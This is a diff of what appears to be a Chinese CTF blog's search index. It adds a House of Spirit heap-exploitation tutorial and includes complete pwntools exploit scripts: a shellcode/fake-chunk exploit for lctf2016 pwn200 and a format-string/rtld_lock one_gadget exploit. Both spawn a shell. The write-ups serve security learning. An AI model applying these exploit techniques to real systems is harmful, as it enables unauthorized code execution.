@@ -32,6 +32,8 @@
 <p>成功getshell</p>
 <figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+<h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png"><span class="image-caption">image-20210907101349756</span></p>
+<p>常规checksec一下，64位，保护全开</p>
 ]]></content>
       <tags>
         <tag>祥云杯PWN</tag>
@@ -374,9 +376,36 @@
     <title>house of系列</title>
     <url>/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/</url>
     <content><![CDATA[<p> 该系列内容较多，将会在较长时间持续更新</p>
-<h2 id="house-of-Roman"><a href="#house-of-Roman" class="headerlink" title="house of Roman"></a>house of Roman</h2><p>这个方法太过局限，就不介绍，只是留个名字</p>
+<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>这个方法太过局限，就不介绍，只是留个名字</p>
 <h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>技术来源：<a href="https://www.anquanke.com/post/id/85357">https://www.anquanke.com/post/id/85357</a></p>
 <p>House of Spirit（下面称为hos）算是一个组合型漏洞的利用，是变量覆盖和堆管理机制的组合利用，关键在于能够覆盖一个堆指针变量，使其指向可控的区域，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域。</p>
+<h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>（1）想要控制的目标区域的前段空间与后段空间都是可控的内存区域</p>
+<p>一般来说想要控制的目标区域多为返回地址或是一个函数指针，正常情况下，该内存区域我们输入的数据是无法控制的，想要利用hos攻击技术来改写该区域，首先需要我们可以控制那片目标区域的前面空间和后面空间，示意图如下</p>
+<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t01ab6f5c485fc67d66.png"><span class="image-caption">http://p7.qhimg.com/t01c4e1f8669a8b77bd.png</span></p>
+<p>（2）存在可将堆变量指针覆盖为指向可控区域，即上一步中的区域</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>（1）伪造堆块，在可控1及可控2构造好数据，将它伪造成一个fast chunk。</p>
+<p>（2）覆盖堆指针指向上一步伪造的堆块。</p>
+<p>（3）释放堆块，将伪造的堆块释放入fast bin里面。</p>
+<p>（4）申请堆块，将刚刚释放的堆块申请出来，最终使得可以往目标区域中写入数据，实现目的。</p>
+<p>第一步中的伪造堆块的过程，fastbin是一个单链表结构，遵循FIFO的规则，32位系统中fastbin的大小是在16<del>64字节之间，64位是在32</del>128字节之间。释放时会进行一些检查，所以需要对伪堆块中的数据进行构造，使其顺利的释放进到fastbin里面</p>
+<h3 id="例题lctf2016pwn200"><a href="#例题lctf2016pwn200" class="headerlink" title="例题lctf2016pwn200"></a>例题lctf2016pwn200</h3><p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204052044.png"><span class="image-caption">image-20210905204052044</span></p>
+<p>常规checksec一下，保护基本没开。</p>
+<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204120841.png"><span class="image-caption">image-20210905204120841</span></p>
+<p>这里的输入存在漏洞，填满可以泄露出rsp上的值，获得栈上地址</p>
+<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/t014c47eb8e813cbe79.png"><span class="image-caption">http://p8.qhimg.com/t01eb7870c8fa4fde39.png</span></p>
+<p>目标地址的构造为上图所示，在money中输入的是伪堆块的size，在id里输入的是下一个堆块的size，以此绕过free释放堆块时候系统的检查</p>
+<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905204549591.png"><span class="image-caption">image-20210905204549591</span></p>
+<p>然后就是：</p>
+<p>（1）覆盖堆指针，在输入money的时候，会覆盖堆块。</p>
+<p>（2）调用free函数将伪堆块释放到fastbin中</p>
+<p>（3）申请堆块，将刚刚的伪堆块申请出来</p>
+<p>（4）输入数据，即可修改目标区域，eip，使其指向shellcode</p>
+<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905230703667.png"><span class="image-caption">image-20210905230703667</span></p>
+<p>这是构造出来的fake_chunk，后面就是要把这块释放了，然后再申请回来，把0x400b34这个地址覆盖为shellcode，即可在退出程序时返回到shellcode去执行</p>
+<p><img src="/2021/07/27/2021-07-27-house-of%E7%B3%BB%E5%88%97/image-20210905212358111.png"><span class="image-caption">image-20210905212358111</span></p>
+<p>getshell！</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,26770)</span><br>p = process(<span class="hljs-string">&#x27;./pwn200&#x27;</span>)<br><br>free_got = <span class="hljs-number">0x0000000000602018</span><br><br>shellcode = asm(shellcraft.amd64.linux.sh(), arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#part one</span><br>payload  = <span class="hljs-string">&#x27;&#x27;</span><br>payload += shellcode.ljust(<span class="hljs-number">48</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;who are u?\n&#x27;</span>)<br>p.send(payload)<br>p.recvuntil(payload)<br><br>rbp_addr = u64(p.recvn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br>shellcode_addr = rbp_addr - <span class="hljs-number">0x50</span> <span class="hljs-comment"># 20H + 30H</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;shellcode_addr: &quot;</span>, <span class="hljs-built_in">hex</span>(shellcode_addr)<br>fake_addr = rbp_addr - <span class="hljs-number">0x90</span> <span class="hljs-comment"># offset 0x40 to shellcode, 0x400a29 return address</span><br><br><br>p.recvuntil(<span class="hljs-string">&#x27;give me your id ~~?\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;33&#x27;</span>) <span class="hljs-comment"># id</span><br>p.recvuntil(<span class="hljs-string">&#x27;give me money~\n&#x27;</span>)<br><br><span class="hljs-comment">#part two</span><br><span class="hljs-comment">#32bytes padding + prev_size + size + padding + fake_addr</span><br>data = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x41</span>)      <span class="hljs-comment"># no strcpy</span><br>data = data.ljust(<span class="hljs-number">0x38</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(fake_addr)<br><span class="hljs-built_in">print</span> data<br>p.send(data)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)     <span class="hljs-comment"># free(fake_addr)</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;choice : &#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)     <span class="hljs-comment">#malloc(fake_addr) #fake_addr</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;long?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;48&#x27;</span>)<br>p.recvline(<span class="hljs-string">&#x27;48&#x27;</span>)  <br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span> + p64(shellcode_addr) <span class="hljs-comment"># write to target_addr</span><br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;choice&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>heap</tag>
@@ -1635,7 +1664,7 @@
 </li>
 </ul>
 <p>10、chunk的三个标志位：从高到低依次表示为：non_main_arena、is_mmap、prev_inuse</p>
-<p>non_main_arena：0表示当前chunk是属于main_arena，1表示属于</p>
+<p>non_main_arena：0表示当前chunk是属于main_arena，1表示不属于</p>
 <p>is_mmap：1表示当前chunk是使用mmap申请的，0表示不是</p>
 <p>prev_inuse：1表示前一个chunk在被用户使用，0表示前一个chunk被释放</p>
 <p>11、如果申请的chunk大小为0x60和0x68返回的是一样大小的chunk，而0x68多出的8个字节是使用了后一个chunk的presize</p>
@@ -2725,32 +2754,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>0Geek2019babyrop</title>
-    <url>/2020/12/14/2020-12-14-0Geek2019babyrop/</url>
-    <content><![CDATA[<p>首先常规操作：下载附件，拖进Linux中，checksec一波~</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/1.png"></p>
-<p>发现开启了RELOR（不能修改GOT表）和NX（堆栈不可执行）保护，并且文件是x86平台下的可执行文件，接着我们执行一下看看</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/2.png"></p>
-<p>然后就是啥都没有~那么直接拖进IDA瞅瞅是啥妖魔鬼怪。在进入反汇编后，main函数里的情况如下</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/3.png"></p>
-<p>能发现，在第八行的伪代码中开启了一个随机数设备，然后，把随机数输入到buf缓冲区中，并且还要将缓冲区的这个随机数放入一个函数里，接下来看看这个函数是什么</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/4.png"></p>
-<p>感觉莫名其妙的把原先的随机数输入到s中，然后读取0x20数据进入到buf，再将两个进行比较。一系列的操作确实让人摸不着头脑，毕竟flag，shell啥的都没有影子，想溢出会发现溢出点不够，这里就不再展示了。那么只好再看看最后一个函数藏了些什么</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/5.png"></p>
-<p>然后这是buf的位置<img src="2020-12-14-0Geek2019babyrop.assets/6.png"></p>
-<p>可以发现呢，第一个if下的是不够溢出，但是，else里的直接把a1作为输入的个数，而a1是char类型的，最大能取到0xff，很显然能溢出！那么，思路到此就很清晰了！首先，我们要让程序能执行到最后一个函数，并且要让这个函数的返回值为0xff，然后就是去找system函数和/bin/sh的参数进行获取shell，最终得到flag。</p>
-<p>那么回过头看看前面的函数<img src="2020-12-14-0Geek2019babyrop.assets/4-1607933710690.png"></p>
-<p>要让程序继续，就是要绕过strncmp这个函数，因为是随机数，所以意味着是无法知道到底是什么，而进行输入到buf中，使其两者相等，那么此时看看strlen这个函数，这个函数有个特点，就是遇到’\0’就会停止读取。如果利用这点，在buf的第一个字节处就填写上’\0’，就可以让比较的字符个数为0，直接跳过比较，从而到我们要的可以溢出函数</p>
-<p>现在仔细的看看最后的函数的条件，它是把前一个函数的返回值当做参数进行输入，在栈中可以看见这个返回值就在我们可以输入的buf的下边</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/7.png"></p>
-<p>这里注意一点，0x2c处的buf是有7个字节大小的。其他就是把0x25的覆盖为0xff。这里做完后，就是再算一下最后一个函数里的溢出距离为0xe7+0x4。那么此刻最大问题就是system函数，可以发现，无论是左边的函数表还是关键字符串中都无法找到system和/bin/sh的调用，所以这里要用到LibcSearcher去寻找libc库，然后计算偏移地址，因为在调用中，两个函数间的相对距离是不变的，并且偏移距离是一致的。那么，就是调用两次函数，一次进行泄露某个函数（我用的是write。read函数也行，我试了，发现会需要让你去选择libc库的版本，write不需要，具体原因不知道~）的got表地址去计算偏移地址，第二次就是调用system获取flag，上exp！</p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/8.png"></p>
-<p><img src="2020-12-14-0Geek2019babyrop.assets/9.png"></p>
-<p>解决！</p>
-<p>题外话一句，脚本文件不能取pwn名字噢！因为pwn已经是个模块了，取了会报错的</p>
-]]></content>
-  </entry>
-  <entry>
     <title>整数溢出</title>
     <url>/2020/12/10/2020-12-10-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
     <content><![CDATA[<p>数据类型以及所取的范围（来自ctf-wiki，之后的内容也是参照了许多的wiki，以及一些来自别处的零碎,环境为64位下使用gcc-5.4）</p>
@@ -3619,7 +3622,7 @@
 <p>python中没有字符类型，一个字符就是另类的长度为1的字符串</p>
 <p>字符串的截取格式为：<strong>变量[头下标:尾下标]</strong>   当把尾下标为空时，表示从头下标的位置输出之后的字符</p>
 <p>7、空行：函数之间或类之间用空行分隔，表示新一段代码的开始。有没有不会对程序造成影响，其作用在于美观以及便于复查</p>
-<p>8、input(  )等待用户输入</p>
+<p>8、input(  )等待用户输入，返回值是字符串类型</p>
 <p>9、python在同一行中使用多条语句，语句之间使用   <strong>;</strong>   分隔 而若是每行只写一个语句，则无需分号</p>
 <p>10、像if、while、def和class的复合语句，首行<strong>以关键字开始，以冒号(:) 结束</strong>，跟在这后面的语句构成一个代码组</p>
 <p>11、输出：print（<strong>没有f！</strong>）</p>
@@ -3743,7 +3746,7 @@
 <p>列表元素是写在**[ ]<strong>之间的，用</strong>逗号**分隔开不同的元素（每个逗号前都是一个元素）</p>
 <p>（2）列表截取格式：<strong>变量[头下标:尾下标]</strong>  （从左往右以0作为开始值，从右往左以-1作为开始值。）</p>
 <p>如图所示，其表示方法与字符串截取的规则一致</p>
-<p><img src="2020-11-09-Python%E7%AC%94%E8%AE%B0.assets/%E5%88%97%E8%A1%A8%E6%88%AA%E5%8F%96%E6%A0%BC%E5%BC%8F-1609204379399.png"></p>
+<p><img src="/2020/11/09/2020-11-09-Python%E7%AC%94%E8%AE%B0/%E5%88%97%E8%A1%A8%E6%88%AA%E5%8F%96%E6%A0%BC%E5%BC%8F-1609204379399.png"></p>
 <p>（3）**+** 也是列表的连接符，可以连接两个列表 </p>
 <p>​          列表*a  ：表示列表复制a次</p>
 <p>（4）可将列表的某段赋值为[ ]，而删去元素。如：a=[1,2,3,4]  a[0:2]=[ ]   那么列表a的内容将变为[3,4]</p>
